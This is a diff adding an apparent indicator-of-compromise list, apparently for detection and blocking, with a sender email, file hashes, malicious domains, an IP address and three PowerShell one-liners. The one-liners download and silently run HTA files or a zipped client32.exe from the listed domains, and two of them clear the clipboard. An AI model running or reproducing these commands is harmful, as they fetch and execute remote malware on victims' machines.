@@ -1,0 +1,17 @@
+rechtsanwalt@ra-silberkuhl.com
+9701fec71e5bbec912f69c8ed63ffb6dba21b9cca7e67da5d60a72139c1795d1
+07e0c15adc6fcf6096dd5b0b03c20145171c00afe14100468f18f01876457c80
+11909c0262563f29d28312baffb7ff027f113512c5a76bab7c5870f348ff778f
+kostumn1.ilabserver.com
+cdn3535.shop
+lashakhazhalia86dancer.com
+languangjob.com
+mylittlecabbage.net
+rtattack.baqebei1.online
+oazevents.com
+jenniferwelsh.com
+91.222.173.113
+cmd /c start /min powershell invoke-webrequest -uri hxxps://lashakhazhalia86dancer.com/c.txt -outfile c:\users\public\default.hta; start-process c:\users\public\default.hta;
+cmd /c start /min powershell $st='c:\\users\\public';$om=$st+'\\start.zip';$ps=$st+'\\client\\client32.exe';invoke-webrequest -uri hxxps://cdn3535[.]shop/1.zip -outfile $om;expand-archive $om $st; start-process $ps;Set-Clipboard -Value ' ';exit; 
+cmd /c start /min powershell $Id = 'c:\users\public\or.hta';invoke-webrequest -uri hxxps://jenniferwelsh.com/header.png -outfile $Id;start-process $Id;Set-Clipboard -Value ' ';exit;==
+
